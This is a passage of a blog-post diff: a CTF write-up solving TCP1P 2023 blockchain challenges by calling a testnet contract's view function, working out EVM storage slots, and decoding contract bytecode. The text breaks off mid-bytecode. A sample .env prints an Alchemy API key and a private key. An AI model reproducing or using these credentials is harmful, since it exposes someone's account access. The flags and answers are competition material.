@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Mj0ln1r-TCP1P CTF 2023 (Blockchain)</title>
+  <link rel="icon" type="image/x-icon" href="assets/img/favicons/favicon.ico">
+  <link rel="stylesheet" href="/css/main.css">
+  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+
+  <!-- <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TCP1P CTF 2023 (Blockchain) | Mj0ln1’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="TCP1P CTF 2023 (Blockchain)" />
+<meta name="author" content="Mj0ln1" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hello readers, I played TCP1P CTF alone (but not anymore). I am focused on blockchain challenges only this time and I managed to solved All blockchain challenges within few hours of CTF. I got many new friends and like minded people in during this CTF. I am excited to share those challenge writeups here." />
+<meta property="og:description" content="Hello readers, I played TCP1P CTF alone (but not anymore). I am focused on blockchain challenges only this time and I managed to solved All blockchain challenges within few hours of CTF. I got many new friends and like minded people in during this CTF. I am excited to share those challenge writeups here." />
+<link rel="canonical" href="http://localhost:4000/posts/tcp1pctf" />
+<meta property="og:url" content="http://localhost:4000/posts/tcp1pctf" />
+<meta property="og:site_name" content="Mj0ln1’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-16T00:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="TCP1P CTF 2023 (Blockchain)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mj0ln1","url":"https://themj0ln1r.github.io"},"dateModified":"2023-10-16T00:00:00+05:30","datePublished":"2023-10-16T00:00:00+05:30","description":"Hello readers, I played TCP1P CTF alone (but not anymore). I am focused on blockchain challenges only this time and I managed to solved All blockchain challenges within few hours of CTF. I got many new friends and like minded people in during this CTF. I am excited to share those challenge writeups here.","headline":"TCP1P CTF 2023 (Blockchain)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/tcp1pctf"},"url":"http://localhost:4000/posts/tcp1pctf"}</script>
+<!-- End Jekyll SEO tag -->
+ 
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div class="head-parent">
+      <a href="/">
+        <h1>mj0ln1r@home:~$</h1></a>
+        <span id="command">cat tcp1pctf</span>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>TCP1P CTF 2023 (Blockchain)</h2>
+  <time datetime="2023-10-16T00:00:00+05:30" class="by-line">16 Oct 2023</time>
+  <p>Hello readers, I played TCP1P CTF alone (but not anymore). I am focused on blockchain challenges only this time and I managed to solved <strong><code class="language-plaintext highlighter-rouge">All</code></strong> blockchain challenges within few hours of CTF. I got many new friends and like minded people in during this CTF. I am excited to share those challenge writeups here.</p>
+
+<p><img src="/assets/img/post_img/tcp1pctf23_progress.png" class="autoimg" /></p>
+
+<h1 id="blockchain">Blockchain</h1>
+
+<h1 id="venue">Venue</h1>
+
+<p><strong>Description :</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Look at the Amazing Party Venue So do you wish to enter?
+contract: 0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3
+provider: https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
+Priv-Key: Please use your own private-key, if you need ETH for transact, You can either DM the Author, or get it by yourself at https://sepoliafaucet.com/
+
+Attached Files : [Venue.sol, 101.txt]
+
+</code></pre></div></div>
+
+<p>It is just a warmup challenge, can be simply done by loading contract on remix, but I wrote a simple <code class="language-plaintext highlighter-rouge">ethersJS</code> script to interact with the contract.</p>
+
+<p><code class="language-plaintext highlighter-rouge">101.txt</code></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Feeling Confuse?
+
+Here's how you can attempt this challenge
+First thing first you need to know what the code does,
+then you need to write a code using web3.js or web3.py
+</code></pre></div></div>
+
+<p>Okay lets see how the contract looks like,</p>
+
+<p><code class="language-plaintext highlighter-rouge">Venue.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Venue</span><span class="p">{</span>
+    <span class="nx">string</span> <span class="kr">private</span> <span class="nx">flag</span><span class="p">;</span>
+    <span class="nx">string</span> <span class="kr">private</span> <span class="nx">message</span><span class="p">;</span>
+
+    <span class="nf">constructor</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">initialFlag</span><span class="p">,</span> <span class="nx">string</span> <span class="nx">memory</span> <span class="nx">initialMessage</span><span class="p">){</span>
+        <span class="nx">flag</span> <span class="o">=</span> <span class="nx">initialFlag</span><span class="p">;</span>
+        <span class="nx">message</span> <span class="o">=</span> <span class="nx">initialMessage</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">enterVenue</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">){</span>
+        <span class="k">return</span> <span class="nx">flag</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">goBack</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">){</span>
+        <span class="k">return</span> <span class="nx">message</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Okay, what we have to do here is to call the <code class="language-plaintext highlighter-rouge">enterVenue()</code> function which will return the flag for us.</p>
+
+<p>To interact with a contract on blockchain we need few things.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Contract ABI
+- Contract Address
+- RPC URI
+- Few Test ETH
+</code></pre></div></div>
+
+<p>✅ We can get Test ETH from faucets</p>
+
+<p>✅ RPC URI is provided</p>
+
+<p>✅ Contract Address is available</p>
+
+<p>Now lets get the ABI using <code class="language-plaintext highlighter-rouge">solc</code> compiler. We can get ABI using <code class="language-plaintext highlighter-rouge">Remix</code> too, but do it in command line.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:~/venue<span class="nv">$ </span>solc Venue.sol <span class="nt">--combined-json</span> abi
+<span class="o">{</span><span class="s2">"contracts"</span>:<span class="o">{</span><span class="s2">"Venue.sol:Venue"</span>:<span class="o">{</span><span class="s2">"abi"</span>:[<span class="o">{</span><span class="s2">"inputs"</span>:[<span class="o">{</span><span class="s2">"internalType"</span>:<span class="s2">"string"</span>,<span class="s2">"name"</span>:<span class="s2">"initialFlag"</span>,<span class="s2">"type"</span>:<span class="s2">"string"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"internalType"</span>:<span class="s2">"string"</span>,<span class="s2">"name"</span>:<span class="s2">"initialMessage"</span>,<span class="s2">"type"</span>:<span class="s2">"string"</span><span class="o">}]</span>,<span class="s2">"stateMutability"</span>:<span class="s2">"nonpayable"</span>,<span class="s2">"type"</span>:<span class="s2">"constructor"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"inputs"</span>:[],<span class="s2">"name"</span>:<span class="s2">"enterVenue"</span>,<span class="s2">"outputs"</span>:[<span class="o">{</span><span class="s2">"internalType"</span>:<span class="s2">"string"</span>,<span class="s2">"name"</span>:<span class="s2">""</span>,<span class="s2">"type"</span>:<span class="s2">"string"</span><span class="o">}]</span>,<span class="s2">"stateMutability"</span>:<span class="s2">"view"</span>,<span class="s2">"type"</span>:<span class="s2">"function"</span><span class="o">}</span>,<span class="o">{</span><span class="s2">"inputs"</span>:[],<span class="s2">"name"</span>:<span class="s2">"goBack"</span>,<span class="s2">"outputs"</span>:[<span class="o">{</span><span class="s2">"internalType"</span>:<span class="s2">"string"</span>,<span class="s2">"name"</span>:<span class="s2">""</span>,<span class="s2">"type"</span>:<span class="s2">"string"</span><span class="o">}]</span>,<span class="s2">"stateMutability"</span>:<span class="s2">"view"</span>,<span class="s2">"type"</span>:<span class="s2">"function"</span><span class="o">}]}}</span>,<span class="s2">"version"</span>:<span class="s2">"0.8.21+commit.d9974bed.Linux.g++"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>✅ We got ABI too</p>
+
+<p>Lets write a simple <code class="language-plaintext highlighter-rouge">Ethers JS</code> script to interact with our contract.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">dotenv</span><span class="dl">'</span><span class="p">).</span><span class="nf">config</span><span class="p">();</span>
+<span class="kd">const</span> <span class="nx">ethers</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">ethers</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="nx">ADDRESS</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0x1AC90AFd478F30f2D617b3Cb76ee00Dd73A9E4d3</span><span class="dl">'</span>
+<span class="nx">ABI</span> <span class="o">=</span> <span class="p">[{</span><span class="dl">"</span><span class="s2">inputs</span><span class="dl">"</span><span class="p">:[{</span><span class="dl">"</span><span class="s2">internalType</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">initialFlag</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">},{</span><span class="dl">"</span><span class="s2">internalType</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">initialMessage</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">}],</span><span class="dl">"</span><span class="s2">stateMutability</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">nonpayable</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">constructor</span><span class="dl">"</span><span class="p">},{</span><span class="dl">"</span><span class="s2">inputs</span><span class="dl">"</span><span class="p">:[],</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">enterVenue</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">outputs</span><span class="dl">"</span><span class="p">:[{</span><span class="dl">"</span><span class="s2">internalType</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">}],</span><span class="dl">"</span><span class="s2">stateMutability</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">view</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">function</span><span class="dl">"</span><span class="p">},{</span><span class="dl">"</span><span class="s2">inputs</span><span class="dl">"</span><span class="p">:[],</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">goBack</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">outputs</span><span class="dl">"</span><span class="p">:[{</span><span class="dl">"</span><span class="s2">internalType</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">}],</span><span class="dl">"</span><span class="s2">stateMutability</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">view</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">function</span><span class="dl">"</span><span class="p">}]</span>
+<span class="c1">// provider</span>
+<span class="kd">const</span> <span class="nx">provider</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nc">AlchemyProvider</span><span class="p">(</span><span class="dl">'</span><span class="s1">sepolia</span><span class="dl">'</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">API_KEY</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">wallet</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nc">Wallet</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PRIVATE_KEY</span><span class="p">,</span> <span class="nx">provider</span><span class="p">);</span>
+<span class="k">async</span> <span class="kd">function</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="kd">const</span> <span class="nx">venueContract</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nc">Contract</span><span class="p">(</span><span class="nx">ADDRESS</span><span class="p">,</span> <span class="nx">ABI</span><span class="p">,</span> <span class="nx">wallet</span><span class="p">)</span>
+    <span class="kd">const</span> <span class="nx">message</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">venueContract</span><span class="p">.</span><span class="nf">goBack</span><span class="p">();</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+    <span class="kd">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">venueContract</span><span class="p">.</span><span class="nf">enterVenue</span><span class="p">();</span> 
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>To make this script works you need to do few things.</p>
+
+<ul>
+  <li>Install Dependencies</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">npm install --save ethers &amp;&amp; npm install dotenv</code></p>
+
+<ul>
+  <li>Make sure to use .env</li>
+</ul>
+
+<p>sample <code class="language-plaintext highlighter-rouge">.env</code></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PRIVATE_KEY=853024a95f52d73fe68a50e4ee11a1a2a6818ef71b63eccea9c07edde5e595c
+API_KEY=SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
+</code></pre></div></div>
+
+<p>Now if we run the javascript code above then the flag will be printed to the screen.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:~/venue<span class="nv">$ </span>node solve.js
+But.... You<span class="s1">'ve come this far... come on! just go inside!
+TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?}
+</span></code></pre></div></div>
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">Flag : TCP1P{d0_3nj0y_th3_p4rty_bu7_4r3_y0u_4_VIP?}</code></p>
+</blockquote>
+
+<h1 id="location">Location</h1>
+
+<p><strong>Description :</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Will you accept the invitation? If so, find the party location now!
+
+Challenge : nc ctf.tcp1p.com 20005
+</code></pre></div></div>
+
+<p>Lets connect to challenge</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:~/venue<span class="nv">$ </span>nc ctf.tcp1p.com 20005
+<span class="o">====</span>Going to The <span class="nv">Party</span><span class="o">====</span>
+
+To Find the party location
+You need to solve a simple riddle regarding a SLOT
+Answer everything correctly, and find the exact location!
+
+Question: In which Slot is Password Stored?
+
+You<span class="s1">'ll answer with and ONLY WITH [numbers]
+ex: 
+0,1,2,3,4.....99
+
+Note: 
+    -   Slot start from 0
+    -   If it doesn'</span>t stored on SLOT, answer 0
+
+Identification Required <span class="k">for </span>Guest
+
+Question:
+
+contract StorageChallenge2 <span class="o">{</span>
+    address[2] private investor<span class="p">;</span>
+    uint64 private password<span class="p">;</span>
+    bytes32 private user<span class="p">;</span>
+    address private owner<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 
+</code></pre></div></div>
+
+<p>Lets understood challenge clearly</p>
+
+<ul>
+  <li>It is EVM storage puzzle</li>
+  <li>We have to find the storage slot of the password</li>
+  <li>Slots starts from 0</li>
+  <li>If password not stored on storage then answer will be 0</li>
+</ul>
+
+<p>So, Lets learn EVM storage layout</p>
+
+<p>State variables of contracts are stored in storage in a compact way such that multiple values sometimes use the same storage slot. Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot 0.</p>
+
+<p>The below image will illustrate the storage layout of the EVM.</p>
+
+<p><img src="/assets/img/post_img/tcp1pctf23_location1.png" class="autoimg" /></p>
+
+<p>State variable stored in the continous manner in storage slots of EVM. Each slot of size 32 bytes or 256 bits only. See an example how the state variables are stores in the storage slots.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Contract</span> <span class="nx">MyContract</span> <span class="p">{</span>
+  <span class="nx">uint256</span> <span class="nx">zero</span><span class="p">;</span>                          <span class="c1">// in slot 0</span>
+  <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint256</span><span class="p">)</span> <span class="nx">one</span><span class="p">;</span>    <span class="c1">// in slot 1</span>
+  <span class="nx">address</span> <span class="nx">two</span><span class="p">;</span>                          <span class="c1">// in slot 2 </span>
+  <span class="nx">bool</span> <span class="nx">a</span><span class="p">;</span>                              <span class="c1">// in slot 3 - 1 byte</span>
+  <span class="nx">uint8</span> <span class="nx">b</span><span class="p">;</span>                             <span class="c1">// in slot 3 - 1 byte </span>
+  <span class="nx">bytes16</span> <span class="nx">c</span><span class="p">;</span>                           <span class="c1">// in slot 3 - 16 bytes</span>
+  <span class="nx">address</span> <span class="nx">immutable</span> <span class="nx">noWhere</span><span class="p">;</span>           <span class="c1">// Do not stored on storage</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The Solidity dont store constant or immutable variables in storage instead the vaues will replaced in every occurrence of these variables with their assigned value in the contract’s bytecode.</p>
+
+<blockquote>
+  <p><strong>Enough knowedge for the challenge, Lets solve challenge.</strong></p>
+</blockquote>
+
+<p>Here in Challenge2 the password is stored in slot 2 as address[2] will reserve slot 0 and slot 1 for two addresses. Slot 2 will be allocated to password.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">StorageChallenge2</span> <span class="p">{</span>
+    <span class="nx">address</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="kr">private</span> <span class="nx">investor</span><span class="p">;</span> <span class="c1">// slot 0 - 1</span>
+    <span class="nx">uint64</span> <span class="kr">private</span> <span class="nx">password</span><span class="p">;</span>  <span class="c1">// slot 2</span>
+    <span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">user</span><span class="p">;</span>  <span class="c1">// slot 3</span>
+    <span class="nx">address</span> <span class="kr">private</span> <span class="nx">owner</span><span class="p">;</span>  <span class="c1">// slot 4</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Lets see Challenge7, Here the password declared as <code class="language-plaintext highlighter-rouge">immutable</code> so it wont stored in any slot so the answer would be 0.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">StorageChallenge7</span> <span class="p">{</span>
+    <span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">key</span><span class="p">;</span>
+    <span class="nx">bytes4</span> <span class="kr">private</span> <span class="nx">key_1</span><span class="p">;</span>
+    <span class="nx">bytes16</span> <span class="kr">private</span> <span class="nx">key_2</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="kr">private</span> <span class="nx">owner</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="kr">private</span> <span class="nx">Token</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="kr">private</span> <span class="nx">immutable</span> <span class="nx">Investor</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="kr">private</span> <span class="nx">Courier</span><span class="p">;</span>
+    <span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">immuatble</span> <span class="nx">password</span><span class="p">;</span>  <span class="c1">// no slot for password </span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Similiarly calculated storage slots for all the 10 challenges manually.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:~/location<span class="nv">$ </span>nc ctf.tcp1p.com 20005
+<span class="o">====</span>Going to The <span class="nv">Party</span><span class="o">====</span>
+
+To Find the party location
+You need to solve a simple riddle regarding a SLOT
+Answer everything correctly, and find the exact location!
+
+Question: In which Slot is Password Stored?
+
+You<span class="s1">'ll answer with and ONLY WITH [numbers]
+ex: 
+0,1,2,3,4.....99
+
+Note: 
+    -   Slot start from 0
+    -   If it doesn'</span>t stored on SLOT, answer 0
+
+Identification Required <span class="k">for </span>Guest
+
+Question:
+
+contract StorageChallenge7 <span class="o">{</span>
+    bytes32 private key<span class="p">;</span>
+    bytes4 private key_1<span class="p">;</span>
+    bytes16 private key_2<span class="p">;</span>
+    address private owner<span class="p">;</span>
+    uint256 private Token<span class="p">;</span>
+    address private immutable Investor<span class="p">;</span>
+    address private Courier<span class="p">;</span>
+    bytes32 private immuatble password<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 0
+<span class="o">===================================</span>
+Question:
+
+contract StorageChallenge1 <span class="o">{</span>
+    bytes32 private user<span class="p">;</span>
+    address[2] private investor<span class="p">;</span>
+    uint64 private password<span class="p">;</span>
+    address private owner<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 3
+<span class="o">===================================</span>
+Question:
+
+contract StorageChallenge8 <span class="o">{</span>
+    bytes32 private key<span class="p">;</span>
+    bytes4 private key_1<span class="p">;</span>
+    bytes16 private key_2<span class="p">;</span>
+    address private owner<span class="p">;</span>
+    uint256 private Token<span class="p">;</span>
+    address private immutable Investor<span class="p">;</span>
+    address private Courier<span class="p">;</span>
+    uint256 private lump_sum<span class="p">;</span>
+    bytes32 private password<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 6
+<span class="o">===================================</span>
+Question:
+
+contract StorageChallenge4 <span class="o">{</span>
+    uint64 private password<span class="p">;</span>
+    bytes32 private user<span class="p">;</span>
+    address[2] private investor<span class="p">;</span>
+    bytes32 immutable  passphrase
+    address private owner<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 0
+<span class="o">===================================</span>
+Question:
+
+contract StorageChallenge10 <span class="o">{</span>
+    bool private string_true<span class="p">;</span>
+    bool private number_false<span class="p">;</span>
+    bool private user_true<span class="p">;</span>
+    bytes32 private username<span class="p">;</span>
+    bytes32 private password<span class="p">;</span>
+    bool public status_creds<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 2
+<span class="o">===================================</span>
+Question:
+
+contract StorageChallenge3 <span class="o">{</span>
+    address private owner<span class="p">;</span>
+    uint64 private password<span class="p">;</span>
+    bytes32 private user<span class="p">;</span>
+    address[2] private investor<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 0
+<span class="o">===================================</span>
+Question:
+
+contract StorageChallenge2 <span class="o">{</span>
+    address[2] private investor<span class="p">;</span>
+    uint64 private password<span class="p">;</span>
+    bytes32 private user<span class="p">;</span>
+    address private owner<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 2
+<span class="o">===================================</span>
+Question:
+
+contract StorageChallenge9 <span class="o">{</span>
+    bytes32 private unique_code<span class="p">;</span>
+    bytes32 private 12_key<span class="p">;</span>
+    address private owner<span class="p">;</span>
+    address[20] public player<span class="p">;</span>
+    bool private valid<span class="p">;</span>
+    bytes32 private password<span class="p">;</span>
+    address private enemy<span class="p">;</span>
+    bool private answered<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 24
+<span class="o">===================================</span>
+Question:
+
+contract StorageChallenge5 <span class="o">{</span>
+    address[2] private investor<span class="p">;</span>
+    bytes32 private user<span class="p">;</span>
+    address private owner<span class="p">;</span>
+    uint64 private password<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 3
+<span class="o">===================================</span>
+Question:
+
+contract StorageChallenge6 <span class="o">{</span>
+    bytes32 immutable passphrase<span class="p">;</span>
+    uint64 private password<span class="p">;</span>
+    bytes32 private user<span class="p">;</span>
+    address[2] private investor<span class="p">;</span>
+    address private owner<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 0
+<span class="o">===================================</span>
+Final Question:
+
+contract Hell_0 <span class="o">{</span>
+    uint256 private avail_money<span class="p">;</span>
+    uint256 private saved_money<span class="p">;</span>
+    bool private not_minus<span class="p">;</span>
+    address private owner<span class="p">;</span>
+    uint256[2] private geo_loc<span class="p">;</span>
+    bool private is_there<span class="p">;</span>
+    bool private there<span class="p">;</span>
+    address private wallet<span class="p">;</span>
+    address private receiver<span class="p">;</span>
+    address[20] private transaction_list<span class="p">;</span>
+    bytes32 private user_creds<span class="p">;</span>
+    uint256 private immutable user_in_uint<span class="p">;</span>
+    bytes32 private password<span class="p">;</span>
+    uint256 private password_uint<span class="p">;</span>
+    bool private correct_password<span class="p">;</span>
+    bool private is_user<span class="p">;</span>
+<span class="o">}</span>
+
+Answer: 28
+Go to Camelleion Street 78
+TCP1P<span class="o">{</span>W00t_w00t_t0_th3_p4rty_47JHbddc<span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>We can calculate the storage slots from remix too. Compile each contract on Remix and go to compilation details and view <code class="language-plaintext highlighter-rouge">STORAGELAYOUT</code>.</p>
+
+<p><img src="/assets/img/post_img/tcp1pctf23_location2.png" class="autoimg" /></p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">Flag : TCP1P{W00t_w00t_t0_th3_p4rty_47JHbddc}</code></p>
+</blockquote>
+
+<h1 id="invitation">Invitation</h1>
+
+<p><strong>Description :</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>An Invitation to an amazing party, only if you find the right location.
+
+Note: Please read the 101.txt.
+Attached Files : [Invitation.txt, 101.txt]
+
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">101.txt</code></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Description:
+    You are provided a bytecode there, yeah?
+    Find out a way to get a certain function name from it,
+    the correct function name begin with "TCP1P" string.
+
+Flag Format
+    if you manage to find the correct function name
+    do the exact same thing as the example below
+    
+    Found Function name: TCP1P_th1s_1s_4_fl4g_()
+        -&gt; remove the "()"
+        -&gt; replace the first "_" with "{"
+        -&gt; replace the last "_" with "}"
+    
+    Final and Right flag format: TCP1P{th1s_1s_4_fl4g}
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Invitation.txt</code></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>60806040526040518060400160405280601e81526020017f546865207269676874206f6e652068617320544350315020737472696e670000815250600090816200004a919062000483565b506040518060400160405280600681526020017f6e6f74206d6500000000000000000000000000000000000000000000000000008152506001908162000091919062000483565b506040518060400160405280601b81526020017f46756e6374696f6e2064623f206e6576657220686561726420656d000000000081525060029081620000d8919062000483565b506040518060400160405280601e81526020017f49742773206e6f7420746865207269676874207468696e67206e6f2e2e2e0000815250600390816200011f919062000483565b506040518060400160405280601081526020017f4841484148414841204e4f54204d4521000000000000000000000000000000008152506004908162000166919062000483565b506040518060400160405280601b81526020017f505553482050555348205055534821212120574841543f20343f20000000000081525060059081620001ad919062000483565b506040518060400160405280601881526020017f54686520342062797465732c206974277320666973687921000000000000000081525060069081620001f4919062000483565b503480156200020257600080fd5b506200056a565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806200028b57607f821691505b602082108103620002a157620002a062000243565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b6000600883026200030b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82620002cc565b620003178683620002cc565b955080198416935080861684